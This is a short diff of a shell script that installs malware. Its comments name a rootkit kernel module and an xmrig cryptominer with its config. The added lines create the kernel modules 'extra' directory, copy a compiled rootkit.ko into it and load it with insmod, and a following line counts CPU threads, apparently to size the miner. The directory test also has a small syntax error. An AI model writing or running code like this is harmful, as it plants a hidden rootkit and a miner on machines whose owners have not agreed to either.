@@ -6,9 +6,17 @@
 #rootkit .ko /lib/modules/$(uname -r)/extra/rootkit.ko
 #xmrig binary and config file /opt/xmrig/FILES
 
+
+module_compile_dir="/home/void/bach-project/src"
+module_dir="/lib/modules/$(uname -r)/extra"
+
 #if extra not real then create it
 #copy compile rootkit.ko to destination
-insmod /lib/modules/$(uname -r)/extra/rootkit.ko
+if [! -d $module_dir]; then
+	mkdir "$module_dir"
+fi
+cp "$module_compile_dir/rootkit.ko" "$module_dir/rootkit.ko"
+insmod "$module_dir/rootkit.ko"
 
 
 threads=$(lscpu | awk -F: '/^CPU\(s\):/ {gsub(/^[ \t]+/, "", $2); print $2}')
